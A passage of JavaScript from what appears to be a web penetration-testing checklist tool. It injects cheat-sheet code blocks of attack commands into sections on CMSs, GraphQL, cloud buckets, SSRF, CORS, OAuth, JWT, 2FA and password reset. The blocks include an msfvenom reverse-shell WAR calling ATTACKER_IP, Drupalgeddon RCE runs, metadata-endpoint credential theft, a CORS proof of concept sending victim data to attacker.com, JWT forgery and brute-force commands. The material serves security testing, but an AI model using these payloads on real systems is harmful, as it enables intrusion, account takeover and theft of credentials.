      const subWp = createSubsection('WordPress — wpscan Aggressive Mode');
      subWp.appendChild(createCodeBlock('bash',
        '# Aggressive full scan\n' +
        'wpscan --url TARGET --api-token TOKEN -e at -e ap -e u \\\n' +
        '  --enumerate ap --plugins-detection aggressive --force\n\n' +
        '# User enumeration only\n' +
        'wpscan --url TARGET -e u\n\n' +
        '# Password brute force\n' +
        'wpscan --url TARGET -U admin -P /usr/share/wordlists/rockyou.txt\n\n' +
        '# Check xmlrpc.php for brute-force / SSRF\n' +
        'curl -s -X POST TARGET/xmlrpc.php \\\n' +
        "  -d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>'"
      ));
      frag.appendChild(subWp);

      const subDrupal = createSubsection('Drupal — droopescan & Drupalgeddon');
      subDrupal.appendChild(createCodeBlock('bash',
        '# Fingerprinting with droopescan\n' +
        'droopescan scan drupal -u https://TARGET\n\n' +
        '# Drupalgeddon2 (CVE-2018-7600) — unauthenticated RCE\n' +
        'python drupalgeddon2.py -u https://TARGET\n\n' +
        '# Drupalgeddon3 (CVE-2018-7602) — authenticated RCE\n' +
        'python drupalgeddon3.py https://TARGET/node/1 <session_cookie>\n\n' +
        '# Check common Drupal paths\n' +
        'GET /CHANGELOG.txt\n' +
        'GET /?q=admin\n' +
        'GET /admin/config/development/maintenance\n' +
        'GET /user/register'
      ));
      frag.appendChild(subDrupal);

      const subFirebase = createSubsection('Firebase Misconfiguration');
      subFirebase.appendChild(createCodeBlock('bash',
        '# Check for open Firebase database (unauthenticated read)\n' +
        'curl https://vuln-domain.firebaseio.com/.json\n\n' +
        '# Enumerate subpaths\n' +
        'curl https://vuln-domain.firebaseio.com/users.json\n' +
        'curl https://vuln-domain.firebaseio.com/admin.json\n\n' +
        '# Test write access\n' +
        'curl -X PUT https://vuln-domain.firebaseio.com/test.json -d \'{"pwned":true}\'\n\n' +
        '# Firebase security rules endpoint\n' +
        'curl https://vuln-domain.firebaseio.com/.settings/rules.json\n\n' +
        '# Firebase Storage bucket (default naming)\n' +
        'curl https://firebasestorage.googleapis.com/v0/b/vuln-domain.appspot.com/o'
      ));
      frag.appendChild(subFirebase);

      const subTomcat = createSubsection('Apache Tomcat — Default Creds & Manager');
      subTomcat.appendChild(createCodeBlock('bash',
        '# Default credentials to try\n' +
        '# admin:admin, admin:password, tomcat:tomcat, admin:tomcat\n' +
        '# manager:manager, admin:s3cret, tomcat:s3cret\n\n' +
        '# Access Tomcat Manager\n' +
        'GET /manager/html\n' +
        'GET /host-manager/html\n\n' +
        '# Upload WAR shell via Manager API\n' +
        'curl -u tomcat:tomcat -T shell.war \\\n' +
        '  "http://TARGET:8080/manager/text/deploy?path=/shell&update=true"\n\n' +
        '# Generate WAR shell with msfvenom\n' +
        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war\n\n' +
        '# CVE-2020-1938 — Ghostcat (AJP file read/RCE)\n' +
        'python ghostcat.py -a TARGET -p 8009 -f /WEB-INF/web.xml'
      ));
      frag.appendChild(subTomcat);

      body.appendChild(frag);
    }
  }

  // --- Sec 35 (GraphQL Testing) ---
  const sec35 = document.getElementById('sec-35');
  if (sec35) {
    const body = sec35.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subIntro = createSubsection('Full Introspection Query');
      subIntro.appendChild(createCodeBlock('graphql',
        'query IntrospectionQuery {\n' +
        '  __schema {\n' +
        '    queryType { name }\n' +
        '    mutationType { name }\n' +
        '    subscriptionType { name }\n' +
        '    types { ...FullType }\n' +
        '    directives {\n' +
        '      name\n' +
        '      description\n' +
        '      locations\n' +
        '      args { ...InputValue }\n' +
        '    }\n' +
        '  }\n' +
        '}\n' +
        'fragment FullType on __Type {\n' +
        '  kind\n' +
        '  name\n' +
        '  description\n' +
        '  fields(includeDeprecated: true) {\n' +
        '    name\n' +
        '    description\n' +
        '    args { ...InputValue }\n' +
        '    type { ...TypeRef }\n' +
        '    isDeprecated\n' +
        '    deprecationReason\n' +
        '  }\n' +
        '  inputFields { ...InputValue }\n' +
        '  interfaces { ...TypeRef }\n' +
        '  enumValues(includeDeprecated: true) {\n' +
        '    name\n' +
        '    description\n' +
        '    isDeprecated\n' +
        '    deprecationReason\n' +
        '  }\n' +
        '  possibleTypes { ...TypeRef }\n' +
        '}\n' +
        'fragment InputValue on __InputValue {\n' +
        '  name\n' +
        '  description\n' +
        '  type { ...TypeRef }\n' +
        '  defaultValue\n' +
        '}\n' +
        'fragment TypeRef on __Type {\n' +
        '  kind\n' +
        '  name\n' +
        '  ofType {\n' +
        '    kind\n' +
        '    name\n' +
        '    ofType {\n' +
        '      kind\n' +
        '      name\n' +
        '      ofType {\n' +
        '        kind\n' +
        '        name\n' +
        '        ofType {\n' +
        '          kind\n' +
        '          name\n' +
        '          ofType {\n' +
        '            kind\n' +
        '            name\n' +
        '            ofType { kind name }\n' +
        '          }\n' +
        '        }\n' +
        '      }\n' +
        '    }\n' +
        '  }\n' +
        '}'
      ));
      frag.appendChild(subIntro);

      const subFinger = createSubsection('Fingerprinting, Threat Matrix & Introspection Bypass');
      subFinger.appendChild(createCodeBlock('bash',
        '# graphw00f — GraphQL fingerprinting\n' +
        'python3 main.py -d -f -t http://TARGET\n\n' +
        '# graphql-threat-matrix reference\n' +
        '# https://github.com/nicholasaleks/graphql-threat-matrix\n\n' +
        '# Bypass introspection disabled via comma technique\n' +
        '# Replace newlines with commas in the __schema query:\n' +
        '__schema{queryType,mutationType,subscriptionType{name},types{...FullType},directives{name,description,locations,args{...InputValue}}}\n\n' +
        '# Bypass using inline fragments instead of named fragments\n' +
        'query { __type(name: "Query") { fields { name type { name kind } } } }\n\n' +
        '# Field suggestion brute-force (useful when introspection blocked)\n' +
        '# Try: query { __typename }  — always works even with introspection off'
      ));
      frag.appendChild(subFinger);

      const subMut = createSubsection('Mutation Attacks & Batched Query Abuse');
      subMut.appendChild(createCodeBlock('graphql',
        '# Mass assignment via mutation\n' +
        'mutation {\n' +
        '  updateUser(id: 1, input: { role: "admin", email: "attacker@evil.com" }) {\n' +
        '    id role email\n' +
        '  }\n' +
        '}\n\n' +
        '# IDOR via mutation\n' +
        'mutation {\n' +
        '  deleteUser(id: 2) { success }\n' +
        '}\n\n' +
        '# Batched queries — rate limit / brute force bypass\n' +
        '[{"query":"mutation{login(user:\\"admin\\",pass:\\"password1\\")}"},\n' +
        ' {"query":"mutation{login(user:\\"admin\\",pass:\\"password2\\")}"},\n' +
        ' {"query":"mutation{login(user:\\"admin\\",pass:\\"password3\\")}"}]\n\n' +
        '# Alias-based brute force (single request)\n' +
        'mutation {\n' +
        '  a1: login(user: "admin", pass: "pass1") { token }\n' +
        '  a2: login(user: "admin", pass: "pass2") { token }\n' +
        '  a3: login(user: "admin", pass: "pass3") { token }\n' +
        '}'
      ));
      frag.appendChild(subMut);

      body.appendChild(frag);
    }
  }

  // --- Sec 48 (S3 Bucket Testing) ---
  const sec48 = document.getElementById('sec-48');
  if (sec48) {
    const body = sec48.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subS3 = createSubsection('AWS S3 Enumeration & Exploitation');
      subS3.appendChild(createCodeBlock('bash',
        '# Sync bucket contents locally (if public read)\n' +
        'aws s3 sync s3://BUCKET-NAME . --no-sign-request\n\n' +
        '# List bucket objects\n' +
        'aws s3 ls s3://BUCKET-NAME --no-sign-request\n\n' +
        '# Test write access\n' +
        'aws s3 cp test.txt s3://BUCKET-NAME/test.txt --no-sign-request\n\n' +
        '# Bucket versioning — list all versions including deleted files\n' +
        'GET https://BUCKET-NAME.s3.amazonaws.com/?versions\n' +
        'GET https://BUCKET-NAME.s3.amazonaws.com/file.txt?versionId=VERSION_ID\n\n' +
        '# Cloud metadata endpoint (SSRF → IAM credentials)\n' +
        'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n' +
        'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME\n\n' +
        '# IMDSv2 (token-based)\n' +
        'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\n' +
        'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/'
      ));
      frag.appendChild(subS3);

      const subGcs = createSubsection('Google Cloud Storage (gsutil)');
      subGcs.appendChild(createCodeBlock('bash',
        '# List GCS bucket (if public)\n' +
        'gsutil ls gs://BUCKET-NAME\n\n' +
        '# Download all files\n' +
        'gsutil -m cp -r gs://BUCKET-NAME .\n\n' +
        '# Check bucket ACL\n' +
        'gsutil acl get gs://BUCKET-NAME\n\n' +
        '# Check IAM policy\n' +
        'gsutil iam get gs://BUCKET-NAME\n\n' +
        '# Test write\n' +
        'gsutil cp test.txt gs://BUCKET-NAME/test.txt\n\n' +
        '# GCP metadata endpoint\n' +
        'curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \\\n' +
        '  -H "Metadata-Flavor: Google"'
      ));
      frag.appendChild(subGcs);

      const subSteg = createSubsection('Steganography & Hidden Data Extraction');
      subSteg.appendChild(createCodeBlock('bash',
        '# Extract hidden data from image with steghide\n' +
        'steghide extract -sf image.jpg\n' +
        'steghide extract -sf image.jpg -p "password"\n\n' +
        '# Check for hidden data without extracting\n' +
        'steghide info image.jpg\n\n' +
        '# Use stegcracker to brute-force passphrase\n' +
        'stegcracker image.jpg /usr/share/wordlists/rockyou.txt\n\n' +
        '# binwalk — find embedded files in binary\n' +
        'binwalk -e file.jpg\n\n' +
        '# exiftool — read metadata (may reveal paths, usernames, GPS)\n' +
        'exiftool image.jpg'
      ));
      frag.appendChild(subSteg);

      body.appendChild(frag);
    }
  }

  // --- Sec 45 (SSRF) ---
  const sec45 = document.getElementById('sec-45');
  if (sec45) {
    const body = sec45.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subBypass = createSubsection('localhost / 127.0.0.1 Bypass Techniques');
      subBypass.appendChild(createCodeBlock('text',
        '# Decimal representation\n' +
        '2130706433\n\n' +
        '# Hex representation\n' +
        '0x7f000001\n\n' +
        '# Octal representation\n' +
        '0177.0000.0000.0001\n\n' +
        '# IPv6 loopback\n' +
        '::1\n\n' +
        '# IPv4-mapped IPv6\n' +
        '::ffff:127.0.0.1\n\n' +
        '# Short notation\n' +
        '127.1\n\n' +
        '# All-zero address\n' +
        '0.0.0.0\n\n' +
        '# Zero short form\n' +
        '0\n\n' +
        '# DNS rebinding / open redirect chaining\n' +
        'http://localtest.me/\n' +
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io\n' +
        'http://spoofed.burpcollaborator.net'
      ));
      frag.appendChild(subBypass);

      const subFrameworks = createSubsection('Framework-Specific SSRF Payloads');
      subFrameworks.appendChild(createCodeBlock('http',
        '# Spring Boot — semicolon separator bypass\n' +
        'GET ;@burpcollaborator.com HTTP/1.1\n' +
        'Host: TARGET\n\n' +
        '# Flask — @ symbol bypass\n' +
        'GET @burpcollaborator.com HTTP/1.1\n' +
        'Host: TARGET\n\n' +
        '# CRLF injection to smuggle SSRF\n' +
        'GET /%0d%0aHost:%20burpcollaborator.com HTTP/1.1\n' +
        'Host: TARGET\n\n' +
        '# SNI-based SSRF (for TLS connections)\n' +
        '# Change SNI in TLS ClientHello to internal host'
      ));
      frag.appendChild(subFrameworks);

      const subBlind = createSubsection('Blind SSRF — Time-Based & Out-of-Band');
      subBlind.appendChild(createCodeBlock('html',
        '<!-- Time-based blind SSRF via HTML rendering -->\n' +
        '<img src="http://BURP_COLLABORATOR/">\n' +
        '<iframe src="http://BURP_COLLABORATOR/"></iframe>\n' +
        '<link rel="stylesheet" href="http://BURP_COLLABORATOR/">\n\n' +
        '<!-- PDF/SVG render SSRF -->\n' +
        '<svg xmlns="http://www.w3.org/2000/svg">\n' +
        '  <image href="http://BURP_COLLABORATOR/ssrf.svg"/>\n' +
        '</svg>'
      ));
      frag.appendChild(subBlind);

      const subRedir = createSubsection('SSRF via Open Redirect');
      subRedir.appendChild(createCodeBlock('php',
        '<?php\n' +
        '// Host an open redirect on your server, then use it as SSRF target\n' +
        "header('Location: http://169.254.169.254/latest/meta-data/');\n" +
        '?>\n\n' +
        '# Payload to target application:\n' +
        '?url=https://attacker.com/redirect.php\n\n' +
        '# If target follows redirects, it hits the internal endpoint\n\n' +
        '# URL-encoded redirect payload (bypass blocklist)\n' +
        '?url=https%3A%2F%2Fattacker.com%2Fredirect.php\n\n' +
        '# Double URL encoding\n' +
        '?url=https%253A%252F%252Fattacker.com%252Fredirect.php'
      ));
      frag.appendChild(subRedir);

      body.appendChild(frag);
    }
  }

  // --- Sec 41 (CORS) ---
  const sec41 = document.getElementById('sec-41');
  if (sec41) {
    const body = sec41.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subPoc = createSubsection('CORS Credential Theft — Full HTML PoC');
      subPoc.appendChild(createCodeBlock('html',
        '<!-- Host on attacker.com, victim visits while logged into target -->\n' +
        '<html>\n' +
        '<body>\n' +
        '<script>\n' +
        '  var xhr = new XMLHttpRequest();\n' +
        '  xhr.open("GET", "https://TARGET/api/user/profile", true);\n' +
        '  xhr.withCredentials = true;\n' +
        '  xhr.onreadystatechange = function() {\n' +
        '    if (xhr.readyState === 4) {\n' +
        '      fetch("https://attacker.com/log?data=" + btoa(xhr.responseText));\n' +
        '    }\n' +
        '  };\n' +
        '  xhr.send();\n' +
        '</script>\n' +
        '</body>\n' +
        '</html>\n\n' +
        '<!-- Fetch API version with credentials -->\n' +
        '<script>\n' +
        "  fetch('https://TARGET/api/sensitive', { credentials: 'include' })\n" +
        '    .then(r => r.text())\n' +
        "    .then(d => fetch('https://attacker.com/log?d=' + btoa(d)));\n" +
        '</script>'
      ));
      frag.appendChild(subPoc);

      const subBypass = createSubsection('Origin Bypass Techniques');
      subBypass.appendChild(createCodeBlock('text',
        '# Null origin (sandboxed iframe / data: URI)\n' +
        'Origin: null\n\n' +
        '# Subdomain injection (if regex checks for "victim.com")\n' +
        'Origin: https://victim.com.attacker.com\n' +
        'Origin: https://attackervictim.com\n' +
        'Origin: https://attacker.com.victim.com\n\n' +
        '# Suffix bypass (if only suffix is checked)\n' +
        'Origin: https://notreallyvictim.com\n\n' +
        '# Prefix bypass\n' +
        'Origin: https://victim.com.attacker.com\n\n' +
        '# HTTP vs HTTPS mismatch\n' +
        'Origin: http://victim.com\n\n' +
        '# Trusted subdomain takeover + CORS exploit chain\n' +
        '# 1. Find subdomain pointing to unclaimed service (e.g., S3, GitHub Pages)\n' +
        '# 2. Claim the service and host CORS exploit payload there\n' +
        '# 3. subdomain.victim.com is trusted, so credentials are returned'
      ));
      frag.appendChild(subBypass);

      body.appendChild(frag);
    }
  }

  // --- Sec 28 (OAuth Attacks) ---
  const sec28 = document.getElementById('sec-28');
  if (sec28) {
    const body = sec28.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subRedirect = createSubsection('redirect_uri Bypass Payloads');
      subRedirect.appendChild(createCodeBlock('text',
        '# Fragment bypass (token stored in hash, not sent to server)\n' +
        'https://hacker.com#victim.com\n\n' +
        '# Subdomain confusion\n' +
        'https://victim.com.hacker.com\n\n' +
        '# @ confusion — browser sends to hacker.com\n' +
        'https://victim.com@hacker.com\n\n' +
        '# Backslash bypass\n' +
        '\\/\\/yoururl.com\n\n' +
        '# Double-slash confusion\n' +
        '//theirsite@yoursite.com\n\n' +
        '# Path traversal in redirect_uri\n' +
        'https://victim.com/oauth/callback/../../../logout\n\n' +
        '# Open redirect chaining: redirect_uri → open redirect on victim domain\n' +
        'redirect_uri=https://victim.com/redirect?url=https://attacker.com'
      ));
      frag.appendChild(subRedirect);

      const subCsrf = createSubsection('CSRF via Missing State Parameter');
      subCsrf.appendChild(createCodeBlock('text',
        '# Exploit:\n' +
        '# 1. Attacker initiates OAuth flow, intercepts the authorization URL\n' +
        '# 2. Drops the state parameter or uses a fixed/known value\n' +
        '# 3. Crafts CSRF payload that sends victim to attacker-controlled code\n' +
        '# 4. Server links attacker code to victim account\n\n' +
        '# Check 1: Is state missing from the authorization request?\n' +
        'GET /oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://TARGET/callback\n\n' +
        '# Check 2: Is state validated on the callback?\n' +
        'GET /callback?code=AUTH_CODE  (no state= parameter)\n\n' +
        '# Check 3: Does a fixed/predictable state pass validation?\n' +
        'state=aaaa or state=12345'
      ));
      frag.appendChild(subCsrf);

      const subLeak = createSubsection('access_token Leak via Referrer Header');
      subLeak.appendChild(createCodeBlock('text',
        '# Scenario: token is returned in URL fragment (#access_token=...)\n' +
        '# If the callback page loads external resources (images, scripts, stylesheets)\n' +
        '# The Referer header may include the token\n\n' +
        '# Check for:\n' +
        '# 1. Authorization servers using response_type=token (implicit flow)\n' +
        '# 2. Callback pages that reference external domains\n' +
        '# 3. Logging/analytics tools that capture the full Referer\n\n' +
        '# Reproduce:\n' +
        '# 1. Complete OAuth flow (implicit), observe redirect URL with #access_token=\n' +
        '# 2. Check network requests from the callback page\n' +
        '# 3. Look for Referer headers containing the token in server logs / Burp\n\n' +
        '# Mitigation check: does server return Referrer-Policy: no-referrer header?'
      ));
      frag.appendChild(subLeak);

      body.appendChild(frag);
    }
  }

  // --- Sec 29 (JWT Attacks) ---
  const sec29 = document.getElementById('sec-29');
  if (sec29) {
    const body = sec29.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subNone = createSubsection('"none" Algorithm Attack');
      subNone.appendChild(createCodeBlock('bash',
        '# Craft a JWT with alg: none to bypass signature verification\n' +
        '# Header: {"alg":"none","typ":"JWT"}\n' +
        '# Payload: {"sub":"admin","role":"admin"}\n' +
        '# Signature: (empty)\n\n' +
        '# Base64url encode header and payload (no padding)\n' +
        'HEADER=$(echo -n \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d "=" | tr \'+/\' \'-_\')\n' +
        'PAYLOAD=$(echo -n \'{"sub":"admin","role":"admin","iat":1234567890}\' | base64 | tr -d "=" | tr \'+/\' \'-_\')\n' +
        'TOKEN="${HEADER}.${PAYLOAD}."\n\n' +
        '# Variants to try (some libraries are case-sensitive)\n' +
        '# "alg": "None", "NONE", "nOnE"'
      ));
      frag.appendChild(subNone);

      const subKid = createSubsection('"kid" Parameter Path Traversal');
      subKid.appendChild(createCodeBlock('json',
        '// Modify the JWT header kid to point to a known file (e.g., /dev/null or empty file)\n' +
        '// If kid is used in a file read to load HMAC key, /dev/null = empty key = sign with ""\n' +
        '{\n' +
        '  "alg": "HS256",\n' +
        '  "typ": "JWT",\n' +
        '  "kid": "../../../../../../dev/null"\n' +
        '}\n\n' +
        '// Sign the token with an empty string as the secret\n' +
        '// Also try: /proc/sys/kernel/randomize_va_space (known content)\n\n' +
        '// kid SQL injection (if kid is used in a SQL query)\n' +
        '{\n' +
        '  "kid": "x\' UNION SELECT \'attacker_secret\' -- -"\n' +
        '}\n' +
        '// Then sign the JWT with the secret "attacker_secret"'
      ));
      frag.appendChild(subKid);

      const subAlgoConf = createSubsection('Algorithm Confusion (RS256 → HS256)');
      subAlgoConf.appendChild(createCodeBlock('bash',
        '# If server uses RS256 (asymmetric), change alg to HS256 (symmetric)\n' +
        '# Use the PUBLIC key as the HMAC secret — server may verify with same key\n\n' +
        '# Step 1: Obtain the public key (check /jwks.json, /.well-known/openid-configuration)\n' +
        'curl https://TARGET/.well-known/jwks.json\n\n' +
        '# Step 2: Convert JWK public key to PEM\n' +
        '# (use jwt_tool or python-jose)\n\n' +
        '# Step 3: Forge HS256 JWT signed with the PEM public key bytes\n' +
        "python3 -c \"\nimport jwt, base64\nwith open('public.pem','rb') as f: key=f.read()\ntoken=jwt.encode({'sub':'admin','role':'admin'},key,algorithm='HS256')\nprint(token)\"\n\n" +
        '# Automated: use jwt_tool\n' +
        'python3 jwt_tool.py TOKEN -X k -pk public.pem'
      ));
      frag.appendChild(subAlgoConf);

      const subBrute = createSubsection('Brute Force JWT Secret & JWK/JKU Injection');
      subBrute.appendChild(createCodeBlock('bash',
        '# Brute force weak HMAC secret\n' +
        'hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt\n' +
        'python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt\n\n' +
        '# JWK injection — embed attacker public key in header\n' +
        '# Modify header to include "jwk" field with your own RSA public key\n' +
        '# Sign token with corresponding private key\n' +
        '# If library trusts embedded JWK → accepts forged token\n\n' +
        '# JKU injection — point to attacker-hosted JWKS\n' +
        '# Modify header: "jku": "https://attacker.com/jwks.json"\n' +
        '# Host JWKS with your public key at that URL\n' +
        '# Sign token with corresponding private key\n\n' +
        '# x5u injection — same concept but with X.509 certificate URL\n' +
        '# "x5u": "https://attacker.com/cert.pem"'
      ));
      frag.appendChild(subBrute);

      body.appendChild(frag);
    }
  }

  // --- Sec 20 (2FA Bypass) ---
  const sec20 = document.getElementById('sec-20');
  if (sec20) {
    const body = sec20.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subRace = createSubsection('Race Condition 2FA Bypass');
      subRace.appendChild(createCodeBlock('text',
        '# Exploit: send multiple simultaneous OTP submission requests\n' +
        '# A race condition may allow the same code to validate twice\n' +
        '# or allow a code submitted after expiry to succeed\n\n' +
        '# Steps:\n' +
        '# 1. Trigger 2FA — receive OTP\n' +
        '# 2. In Burp Repeater / Turbo Intruder, send 10-20 simultaneous POST requests\n' +
        '#    all with the same OTP code\n' +
        '# 3. Check if any response returns a valid session\n\n' +
        '# Turbo Intruder race condition template:\n' +
        '# def queueRequests(target, wordlists):\n' +
        '#     for i in range(20):\n' +
        '#         engine.queue(target.req)\n' +
        '# def handleResponse(req, interesting):\n' +
        '#     if "dashboard" in req.response: ...'
      ));
      frag.appendChild(subRace);

      const subNav = createSubsection('Direct Navigation Bypass & Backup Code Brute Force');
      subNav.appendChild(createCodeBlock('text',
        '# Direct navigation bypass:\n' +
        '# After entering username/password (step 1), skip the 2FA step\n' +
        '# Navigate directly to an authenticated endpoint\n' +
        'GET /dashboard\n' +
        'GET /account/settings\n' +
        '# If the server only checks step-1 auth cookie and not 2FA completion\n' +
        '# the page will load — this is a logic flaw\n\n' +
        '# Backup code brute force:\n' +
        '# Backup codes are often 6-8 digit numeric\n' +
        '# If no rate limiting on backup code endpoint:\n' +
        'ffuf -u https://TARGET/account/2fa/backup -X POST \\\n' +
        '  -d "backup_code=FUZZ" -w backup_codes_wordlist.txt \\\n' +
        '  -H "Cookie: session=SESSION_COOKIE" -mc 302,200\n\n' +
        '# OAuth login bypass:\n' +
        '# If app allows login via OAuth (Google/GitHub)\n' +
        '# Try logging in via OAuth — 2FA may not be triggered for social logins'
      ));
      frag.appendChild(subNav);

      const subSession = createSubsection('Session Swap Technique Between Browsers');
      subSession.appendChild(createCodeBlock('text',
        '# Session swap / 2FA step confusion:\n' +
        '# 1. Browser A: complete step 1 (username/password) — get pre-2FA session\n' +
        '# 2. Browser B: complete both steps for a DIFFERENT account you control\n' +
        '#    — get a fully authenticated session cookie\n' +
        '# 3. In Browser A: replace the pre-2FA session cookie\n' +
        '#    with the fully-authenticated session from Browser B\n' +
        '# 4. Navigate to authenticated endpoint\n' +
        '# If the server does not bind the session to the specific user during 2FA,\n' +
        '# Browser A may gain access to the victim account without completing 2FA\n\n' +
        '# Also test:\n' +
        '# - Re-using a previously valid (now expired) 2FA code\n' +
        '# - Submitting OTP from a different account\n' +
        '# - Response manipulation: change "status":"fail" to "status":"success"'
      ));
      frag.appendChild(subSession);

      body.appendChild(frag);
    }
  }

  // --- Sec 18 (Reset Password) ---
  const sec18 = document.getElementById('sec-18');
  if (sec18) {
    const body = sec18.querySelector('.section-body');
    if (body) {
      const frag = document.createDocumentFragment();

      const subEmailChain = createSubsection('Email Verification Bypass Chain');
      subEmailChain.appendChild(createCodeBlock('text',
        '# Exploit:\n' +
        '# 1. Register an account with email: attacker@attacker.com\n' +
        '# 2. Change email to victim@victim.com BEFORE verifying the original email\n' +
        '# 3. Check if the old verification link (sent to attacker@attacker.com)\n' +
        '#    still verifies the account — now with victim email\n' +
        '# 4. If yes: you control an account with victim email without access to inbox\n\n' +
        '# Variant — pre-account takeover:\n' +
        '# 1. Register attacker-controlled account with victim email (if no email check at signup)\n' +
        '# 2. Set up the account (add phone 2FA, known password)\n' +
        '# 3. Victim later registers with same email → app links to existing account\n' +
        '# 4. Attacker still has access'
      ));
      frag.appendChild(subEmailChain);

      const subHost = createSubsection('Host Header Injection in Password Reset');
      subHost.appendChild(createCodeBlock('http',
        '# Standard password reset request\n' +
        'POST /account/reset-password HTTP/1.1\n' +
        'Host: TARGET\n' +
        'Content-Type: application/x-www-form-urlencoded\n\n' +
        'email=victim@victim.com\n\n' +
        '# Inject attacker-controlled host to poison reset link\n' +
        'POST /account/reset-password HTTP/1.1\n' +
        'Host: attacker.com\n' +
        'Content-Type: application/x-www-form-urlencoded\n\n' +
        'email=victim@victim.com\n\n' +
        '# Double Host header bypass\n' +
        'Host: TARGET\n' +
        'Host: attacker.com\n\n' +
        '# X-Forwarded-Host bypass\n' +
        'Host: TARGET\n' +
        'X-Forwarded-Host: attacker.com\n\n' +
        '# Other headers to try:\n' +
        '# X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded'
      ));
      frag.appendChild(subHost);

      const subJson = createSubsection('JSON Parameter Pollution for Reset Emails');
      subJson.appendChild(createCodeBlock('http',
        '# Original request\n' +
        'POST /api/reset-password HTTP/1.1\n' +
        'Content-Type: application/json\n\n' +
        '{"email":"victim@victim.com"}\n\n' +
        '# JSON array injection — app may send reset to all addresses in array\n' +
        '{"email":["victim@victim.com","attacker@attacker.com"]}\n\n' +
        '# Duplicate key — depends on parser (last or first wins)\n' +
        '{"email":"victim@victim.com","email":"attacker@attacker.com"}\n\n' +
        '# Carbon copy via separator\n' +
        '{"email":"victim@victim.com,attacker@attacker.com"}\n' +
        '{"email":"victim@victim.com%20attacker@attacker.com"}\n' +
        '{"email":"victim@victim.com|attacker@attacker.com"}\n\n' +
        '# Newline injection in email field\n' +
        '{"email":"victim@victim.com\\nCc: attacker@attacker.com"}'
      ));
      frag.appendChild(subJson);

      body.appendChild(frag);
    }
  }
}

// ==================== Init ====================
document.addEventListener('DOMContentLoaded', () => {
  // --- UI Cleanup: remove global search, file upload, simplify select ---
  cleanupUI();

  // --- Aggressive Tool Optimization & Content Migration (before storing originals) ---
  upgradeToolCommands();
  injectMigratedContent();

  initCopyButtons();

  // --- Store original code contents before any transformation ---
  storeOriginalCode();

  // --- Load persisted target type ---
  try {
    const savedType = localStorage.getItem('rvu_target_type');
    if (savedType && targetTypeSel) {
      targetTypeSel.value = savedType;
    }
  } catch(e) {}

  // --- Load persisted active target ---
  try {
    const savedActive = localStorage.getItem('rvu_active_target');
    if (savedActive) {
      const parsed = JSON.parse(savedActive);
      if (parsed && parsed.value) {
        targetInput.value = parsed.value;
        if (parsed.type && targetTypeSel) {
          targetTypeSel.value = parsed.type;
        }
        setActiveTarget(parsed.value, parsed.type);
      }
    }
  } catch(e) {}

  // --- Load completed sections ---
  try {
    const done = JSON.parse(localStorage.getItem('rvu_completed') || '[]');
    done.forEach(id => {
      const sec = document.getElementById(id);
      if (!sec) return;
      const btn = sec.querySelector('.section-complete-btn');
      if (btn) { btn.classList.add('done'); btn.textContent = '✓ Done'; }
      const navLink = document.querySelector(`.nav-link[data-target="${CSS.escape(id)}"]`);
      if (navLink) navLink.classList.add('completed');
    });
  } catch(e) {}

  // --- Load checkbox states ---
  try {
    const cbState = JSON.parse(localStorage.getItem('rvu_checkboxes') || '{}');
    document.querySelectorAll('.checklist input[type="checkbox"]').forEach((cb, i) => {
      if (cbState[i]) {
        cb.checked = true;
        const li = cb.closest('li');
        if (li) li.classList.add('checked');
      }
    });
  } catch(e) {}

  updateProgress();

  // --- Restore active section (Single View persistence) ---
  const firstSection = document.querySelector('.methodology-section');
  const defaultSectionId = firstSection ? firstSection.id : null;
  try {
    const savedSection = localStorage.getItem('rvu_active_section');
    if (savedSection && document.getElementById(savedSection)) {
      showSection(savedSection);
    } else if (defaultSectionId) {
      showSection(defaultSectionId);
    }
  } catch(e) {
    if (defaultSectionId) showSection(defaultSectionId);
  }

  // --- Inject section notes into every .section-body ---
  let notesDebounce;
  const notes = {};
  try { Object.assign(notes, JSON.parse(localStorage.getItem('rvu_notes') || '{}')); } catch(e) {}

  document.querySelectorAll('.section-body').forEach(body => {
    const sec = body.closest('.methodology-section');
    if (!sec) return;
    const secId = sec.id;

    const wrapper = document.createElement('div');
    wrapper.className = 'section-notes';

    const ta = document.createElement('textarea');
    ta.placeholder = '📝 Add your payloads or target-specific notes here...';
    if (notes[secId]) ta.value = notes[secId];
    ta.addEventListener('input', () => {
      notes[secId] = ta.value;
      clearTimeout(notesDebounce);
      notesDebounce = setTimeout(() => {
        try { localStorage.setItem('rvu_notes', JSON.stringify(notes)); } catch(e) {}
      }, 400);
    });

    wrapper.appendChild(ta);
    body.appendChild(wrapper);
  });

  // --- Inject Clear Workspace Button (only) ---
  const container = document.getElementById('domain-input-system');
  if (container) {
    const btnRow = document.createElement('div');
    btnRow.className = 'workspace-actions';

    const clearBtn = document.createElement('button');
    clearBtn.className = 'btn btn-red';
    clearBtn.textContent = '🗑️ Clear Workspace';
    clearBtn.addEventListener('click', () => {
      localStorage.removeItem('rvu_completed');
      localStorage.removeItem('rvu_checkboxes');
      localStorage.removeItem('rvu_notes');
      localStorage.removeItem('rvu_active_target');
      localStorage.removeItem('rvu_active_section');
      localStorage.removeItem('rvu_target_type');
      targetInput.value = '';
      clearActiveTarget();
      document.querySelectorAll('.section-complete-btn.done').forEach(btn => {
